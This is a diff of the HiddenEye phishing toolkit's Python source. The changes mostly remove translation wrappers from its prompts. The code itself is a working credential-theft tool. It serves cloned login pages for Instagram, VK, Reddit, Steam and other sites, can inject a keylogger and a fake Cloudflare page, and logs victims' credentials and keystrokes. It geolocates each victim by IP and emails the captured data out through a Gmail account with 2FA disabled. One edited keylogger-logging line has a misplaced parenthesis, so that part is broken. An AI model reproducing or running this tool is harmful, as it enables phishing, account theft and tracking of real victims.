+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
@@ -481,7 +483,7 @@ ________________________________________________________________________________
         runPhishing('Steam', customOption)
     elif option == '14':
         loadModule('VK')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN4, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -565,7 +567,7 @@ ________________________________________________________________________________
         runPhishing('Yandex', customOption)
     elif option == '35':
         loadModule('Reddit')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Reddit', customOption)
     elif option == '36':
         loadModule('Subitoit')
@@ -580,21 +582,21 @@ ________________________________________________________________________________
         endMessage()
 
 def loadModule(module): #This one just show text..
-       print (_(''' {0}
- [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------''').format(MAIN0, MAIN2))
+       print(''' {0}
+ [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))
 
 def inputCustom(): #Question where user can input custom web-link
      system('clear')
-     print(_('''{1}
+     print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------''').format(MAIN0, MAIN2))
-     print(_('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(MAIN2, MAIN4))
-     print(_('''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)''').format(MAIN2, MAIN4))
-     print(_('''\n{0}[{1}*{0}]{0}Insert a custom redirect url:''').format(MAIN0, MAIN4))
-     custom = input(_('''\n{0}REDIRECT HERE>>> {2}''').format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+     print('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)'''.format(MAIN2, MAIN4))
+     print('''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
+     print('''\n{0}[{1}*{0}]{0}Insert a custom redirect url:'''.format(MAIN0, MAIN4))
+     custom = input('''\n{0}REDIRECT HERE>>> {2}'''.format(MAIN0, MAIN4, MAIN2))
      if 'http://' in custom or 'https://' in custom :
          pass
      else:
@@ -623,25 +625,25 @@ def inputCustom(): #Question where user can input custom web-link
 
 def emailPrompt():
 	system('clear')
-	print (_('''{1}
+	print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+'''.format(MAIN0, MAIN2))
+	print("-------------------------------\n{0}[ PROMPT: NEED CAPTURED DATA TO EMAIL ? ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
 	addingEmail()
 	
 def addingEmail():
-        print(_("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ").format(MAIN0, MAIN4))
-        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)").format(MAIN0, MAIN4))
-        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
-        if choice == 'y' or choice == 'Y':
-            print(_("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n").format(MAIN0, MAIN4))
+        print("\n{0}[{1}!{0}]{1}No Need To Configure, If you have Already Done. ".format(MAIN0, MAIN4))
+        print("\n{0}[{1}*{0}]{0}DO YOU WANT CAPTURED DATA TO BE EMAILED, THEN CREATE CONFIG FILE -{1}(Y/N)".format(MAIN0, MAIN4))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2)).upper()
+        if choice == 'Y':
+            print("\n{0}[{1}!{0}] BEFORE STARTING MAKE SURE THESE THINGS: \n\n{0}[{1}+{0}] {1}YOU HAVE CORRECT GMAIL USERNAME & PASSWORD\n{0}[{1}+{0}] {1}YOU HAVE DISABLED 2-FACTOR AUTHENTICATION FROM YOUR GMAIL ACCOUNT\n{0}[{1}+{0}] {1}YOU HAVE TURNED ON LESS SECURED APPS \n    (https://myaccount.google.com/lesssecureapps) \n\n".format(MAIN0, MAIN4))
             input('[.] Press Enter To Start Configuring Gmail Credential File...')
             emailPrompt2()
-        elif choice == 'n' or choice == 'N':
+        elif choice == 'N':
             pass
         else:
             print('[^] ERROR: Please choose correct option to continue...')
@@ -651,28 +653,28 @@ def addingEmail():
 
 def emailPrompt2():
 	system('clear')
-	print (_('''{1}
+	print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+'''.format(MAIN0, MAIN2))
+	print("-------------------------------\n{0}[ PROMPT: CONFIG EMAIL CREDENTIAL FILE ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
 	emailConfig()
 	
 def emailConfig ():
     system('cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py')
-    GMAILACCOUNT=input(_("{0}[{1}+{0}]{0} Enter Your Gmail Username:{1} ").format(MAIN0, MAIN4))
+    GMAILACCOUNT=input("{0}[{1}+{0}]{0} Enter Your Gmail Username:{1} ".format(MAIN0, MAIN4))
     with open('Defs/Send_Email/emailconfig.py') as f:
         read_data = f.read()
         c = read_data.replace('GMAILACCOUNT',GMAILACCOUNT)
         f = open('Defs/Send_Email/emailconfig.py', 'w')
         f.write(c)
         f.close()
-        print(_("{0}[.] {1}Email Address Added To config File. !\n").format(MAIN0, MAIN4))
+        print("{0}[.] {1}Email Address Added To config File. !\n".format(MAIN0, MAIN4))
         
-    GMAILPASSWORD=getpass.getpass(_("{0}[{1}+{0}]{0} Enter Your Gmail Password:{1} ").format(MAIN0, MAIN4))
+    GMAILPASSWORD=getpass.getpass("{0}[{1}+{0}]{0} Enter Your Gmail Password:{1} ".format(MAIN0, MAIN4))
     with open('Defs/Send_Email/emailconfig.py') as f:
         read_data = f.read()
         GMAILPASSWORD = base64.b64encode(GMAILPASSWORD.encode())
@@ -681,59 +683,59 @@ def emailConfig ():
         f = open('Defs/Send_Email/emailconfig.py', 'w')
         f.write(c)
         f.close()
-        print(_("{0}[.] {1}Password(Encoded) Added To config File. !\n").format(MAIN0, MAIN4))
-    RECIPIENTEMAIL=input(_("{0}[{1}+{0}]{0} Enter Recipient Email:{1} ").format(MAIN0, MAIN4))
+        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(MAIN0, MAIN4))
+    RECIPIENTEMAIL=input("{0}[{1}+{0}]{0} Enter Recipient Email:{1} ".format(MAIN0, MAIN4))
     with open('Defs/Send_Email/emailconfig.py') as f:
         read_data = f.read()
         c = read_data.replace('RECIPIENTEMAIL',RECIPIENTEMAIL)
         f = open('Defs/Send_Email/emailconfig.py', 'w')
         f.write(c)
         f.close()
-        print(_("{0}[.] {1}Recipient Email Address Added To config File. !\n").format(MAIN0, MAIN4))
-        print(_('\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)').format(MAIN0, MAIN4)) 
+        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".format(MAIN0, MAIN4))
+        print('\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)'.format(MAIN0, MAIN4)) 
 
 def cloudfarePrompt():
 	
 	system('clear')
-	print (_('''{1}
+	print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+'''.format(MAIN0, MAIN2))
+	print("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
 	addingCloudfare()
 	
 def addingCloudfare():
-        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4))
-        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
-        if choice == 'y' or choice == 'Y':
+        print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(MAIN0, MAIN4))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2)).upper()
+        if choice == 'Y':
            addCloudfare()
         else:
             sleep(1)           
            
 def addCloudfare():
          system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
-         print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(MAIN0, MAIN4))
          sleep(1)
 		
 def keyloggerprompt():
 	system('clear')
-	print (_('''{1}
+	print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+'''.format(MAIN0, MAIN2))
+	print("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(MAIN0, MAIN4))
 
 def addingkeylogger():
-        print(_("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n").format(MAIN0, MAIN4))
-        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)").format(MAIN0, MAIN4))
-        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
-        if choice == 'y' or choice == 'Y':
+        print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(MAIN0, MAIN4))
+        print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(MAIN0, MAIN4))
+        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2)).upper()
+        if choice == 'Y':
            addkeylogger()
         else:
             sleep(1)
@@ -746,7 +748,7 @@ def addkeylogger():
          f = open('Server/www/index.html', 'w')
          f.write(c)
          f.close()
-         print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!".format(MAIN0, MAIN4))
          sleep(2)
      else:
          with open('Server/www/index.php') as f:
@@ -755,7 +757,7 @@ def addkeylogger():
          f = open('Server/www/index.php', 'w')
          f.write(c)
          f.close()
-         print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!".format(MAIN0, MAIN4))
          sleep(2)
 
 def runServer(port):
@@ -763,15 +765,15 @@ def runServer(port):
     system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
 
 def emailPrompt3(): #Ask user to start sending credentials to recipient Email Address.
-        choice = input("\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2))
-        if choice == 'y' or choice == 'Y':
+        choice = input("\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
+        if choice == 'Y':
            if path.isfile('Defs/Send_Email/emailconfig.py') == True:
                system('python3 Defs/Send_Email/SendEmail.py')
            else:
                print('[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
                sleep(2)
                endMessage()  
-        elif choice == 'n' or choice == 'N':
+        elif choice == 'N':
             endMessage()
         else:
             system('clear')
@@ -781,14 +783,14 @@ def emailPrompt3(): #Ask user to start sending credentials to recipient Email Ad
             return emailPrompt3()
 
 def endMessage(): #Message when HiddenEye exit
-        choice = input("\n\n{0}[{1}?{0}] Rerun(r) : Exit(x) : SendEmail(M)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2))
-        if choice == 'r' or choice == 'R':
+        choice = input("\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
+        if choice == 'R':
             system('sudo python3 HiddenEye.py')
-        elif choice == 'm' or choice == 'M':
+        elif choice == 'M':
             emailPrompt3()
-        elif choice == 'x' or choice == 'X':
+        elif choice == 'X':
             system('clear')
-            print (_('''
+            print('''
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
             {1}https://github.com/DarkSecDevelopers/HiddenEye
 
@@ -800,7 +802,7 @@ def endMessage(): #Message when HiddenEye exit
      [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
      [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
 
-  {3}  [[*]] THANKS TO USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n ''').format(MAIN2, MAIN2, MAIN4, MAIN0))
+  {3}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
         else:
             system('clear')
             return endMessage()
@@ -808,12 +810,12 @@ def endMessage(): #Message when HiddenEye exit
 def getCredentials(port):
 
 
-    print(_("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n").format(MAIN0, MAIN2, MAIN4))
+    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(MAIN0, MAIN2, MAIN4))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                writeLog(_('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines))
+                writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(MAIN2, MAIN3, lines))
                 system('touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
 
         creds.close()
@@ -827,15 +829,15 @@ def getCredentials(port):
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
-                    print(_(' \n\n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(MAIN0, MAIN2, lines))
+                    print(' \n\n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}'.format(MAIN0, MAIN2, lines))
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
-                    writeLog(_(' \n\n{0}[ VICTIM INFO FOUND ]{1}:\n{0}{2}{1}').format(MAIN3, MAIN2, lines))
-                    writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(MAIN3, MAIN2, longitude, latitude))
-                    writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
-                    writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
+                    writeLog(' \n\n{0}[ VICTIM INFO FOUND ]{1}:\n{0}{2}{1}'.format(MAIN3, MAIN2, lines))
+                    writeLog(' \n{0}Longitude: {2} \nLatitude: {3}{1}'.format(MAIN3, MAIN2, longitude, latitude))
+                    writeLog(' \n{0}ISP: {2} \nCountry: {3}{1}'.format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
+                    writeLog(' \n{0}Region: {2} \nCity: {3}{1}'.format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
                 system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
 
         creds.close()
@@ -844,7 +846,7 @@ def getCredentials(port):
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(_(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}%s{1}').format(MAIN3, MAIN2) % lines)
+                writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}').format(MAIN3, MAIN2, lines)
                 system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 writeLog('{0}...............................'.format(MAIN0, MAIN4))
 
